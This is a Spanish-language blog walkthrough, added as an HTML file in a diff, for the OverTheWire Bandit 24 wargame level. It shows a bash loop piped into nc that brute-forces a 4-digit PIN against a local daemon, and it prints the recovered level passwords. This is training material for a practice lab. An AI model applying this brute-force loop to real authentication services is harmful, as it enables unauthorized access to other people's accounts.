@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Bandit 24 / Overthewire</title>
+    <meta name="description" content="">
+    <meta name="keywords" content='blogs, informatica, forense, porfolio, hacking, jaime gómez martínez, jaime gomez martinez, jaime gomez, bandit, ssh, sshpass, linux, bash'>
+
+    <meta property="og:url" content="https://llo0zy.github.io/bandit/bandit-24/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Bandit 24 / Overthewire">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://llo0zy.github.io/">
+    <meta property="og:image:secure_url" content="https://llo0zy.github.io/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Bandit 24 / Overthewire">
+    <meta name="twitter:description" content="">
+    <meta property="twitter:domain" content="https://llo0zy.github.io/bandit/bandit-24/">
+    <meta property="twitter:url" content="https://llo0zy.github.io/bandit/bandit-24/">
+    <meta name="twitter:image" content="https://llo0zy.github.io/">
+
+    
+    <link rel="canonical" href="https://llo0zy.github.io/bandit/bandit-24/" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.1cad96fd391c2b9ae7d512622db1ad1da8fd7f021e784b7b7697075309969323.js" integrity="sha256-HK2W/TkcK5rn1RJiLbGtHaj9fwIeeEt7dpcHUwmWkyM="></script>
+
+    
+    
+    Porfolio web | yoshl
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://llo0zy.github.io/">Jaime Gómez - (Aka. yoshl)</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://llo0zy.github.io/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://llo0zy.github.io/bandit/"> Bandit Overthewire Levels </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://llo0zy.github.io/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/Llo0zy"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://llo0zy.github.io/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://llo0zy.github.io/bandit/"> Bandit Overthewire Levels </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://llo0zy.github.io/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/Llo0zy"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Bandit 24 / Overthewire</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            octubre 29, 2023
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/bandit">bandit</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/ssh">ssh</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/sshpass">sshpass</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/linux">linux</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/bash">bash</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h1 id="información">Información</h1>
+<p><em>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.<br>
+You do not need to create new connections each time</em></p>
+<h1 id="resolución">Resolución</h1>
+<p>En este ejercicio vamos avanzando el nivel de <em>scripting</em>, haciendo un <em>brute force</em> de un pin de 4 dígitos junto a la contraseña de <strong>bandit 24</strong>, y mandar por el <strong>puerto 30002</strong> del <strong>localhost</strong>:</p>
+<h2 id="creando-listado-de-números--primer-paso">Creando listado de números / Primer paso</h2>
+<p>Como queremos una lista de 4 dígitos empezamos con el comando <strong>seq</strong> que nos crea un listado hasta el número que tu le marques:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit24@bandit:~$ seq <span style="color:#ae81ff">10</span>
+<span style="color:#ae81ff">1</span>
+<span style="color:#ae81ff">2</span>
+<span style="color:#ae81ff">3</span>
+<span style="color:#ae81ff">4</span>
+<span style="color:#ae81ff">5</span>
+<span style="color:#ae81ff">6</span>
+<span style="color:#ae81ff">7</span>
+<span style="color:#ae81ff">8</span>
+<span style="color:#ae81ff">9</span>
+<span style="color:#ae81ff">10</span>
+</code></pre></div><h2 id="generando-las-1000-combinaciones--segundo-paso">Generando las 1.000 combinaciones / Segundo paso</h2>
+<p>Ahora que sabemos esto podemos crear un <strong>bucle for</strong> para que nos haga <strong>1.000 combinaciones</strong> con la contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">0</span> 9999<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
+	echo <span style="color:#e6db74">&#34;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar </span>$i<span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">done</span>
+</code></pre></div><h2 id="mandando-las-combinaciones-al-puerto--tercer-paso">Mandando las combinaciones al puerto / Tercer paso</h2>
+<p>Ya que tenemos las combinaciones podemos mandarlas al <strong>puerto 30002</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">0</span> 9999<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
+    echo <span style="color:#e6db74">&#34;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar </span>$i<span style="color:#e6db74">&#34;</span>
+
+<span style="color:#66d9ef">done</span> | nc localhost <span style="color:#ae81ff">30002</span>
+</code></pre></div><p>Al inciarlo nos sale muchos errores, eso es porque la combinación es incorrecta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit24@bandit:/tmp/bandit42$ ./script.sh 
+I am the pincode checker <span style="color:#66d9ef">for</span> user bandit25. Please enter the password <span style="color:#66d9ef">for</span> user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+</code></pre></div><h2 id="evitando-los-errores--último-paso">Evitando los errores / Último paso</h2>
+<p>Con <strong>grep -v</strong> podemos hacer que no nos muestre todas las líneas que contengan la palabra: <strong>Wrong</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">0</span> 9999<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
+    echo <span style="color:#e6db74">&#34;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar </span>$i<span style="color:#e6db74">&#34;</span>
+
+<span style="color:#66d9ef">done</span> | nc localhost <span style="color:#ae81ff">30002</span> | grep -v <span style="color:#e6db74">&#34;Wrong&#34;</span>
+</code></pre></div><p>Y tachan!!!, ya nos muestra la contraseña de <strong>bandit 25</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit24@bandit:/tmp/bandit42$ ./script.sh 
+I am the pincode checker <span style="color:#66d9ef">for</span> user bandit25. Please enter the password <span style="color:#66d9ef">for</span> user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+Exiting.
+</code></pre></div>
+        </p>
+        
+    </div>
+
+    <div class="prev-next">
+        
+            
+                
+<div class="prev-post">
+    <p>
+        <a href="/bandit/bandit-25/">
+            &#8592;
+            Anterior:
+            Bandit 25 / Overthewire
+        </a>
+    </p>
+    <p class="prev-post-date">
+        octubre 29, 2023
+    </p>
+</div>
+
+
+
+<div class="next-post">
+    <p>
+        <a href="/bandit/bandit-23/">
+            Siguiente:
+            Bandit 23 / Overthewire
+            &#8594;
+        </a>
+    </p>
+        <p class="next-post-date">
+            octubre 29, 2023
+        </p>
+</div>
+
+
+            
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#información">Información</a></li>
+    <li><a href="#resolución">Resolución</a>
+      <ul>
+        <li><a href="#creando-listado-de-números--primer-paso">Creando listado de números / Primer paso</a></li>
+        <li><a href="#generando-las-1000-combinaciones--segundo-paso">Generando las 1.000 combinaciones / Segundo paso</a></li>
+        <li><a href="#mandando-las-combinaciones-al-puerto--tercer-paso">Mandando las combinaciones al puerto / Tercer paso</a></li>
+        <li><a href="#evitando-los-errores--último-paso">Evitando los errores / Último paso</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>
+        © 2023 - All rights reserved
+    </span>
+</footer>
+</body>
+</html>
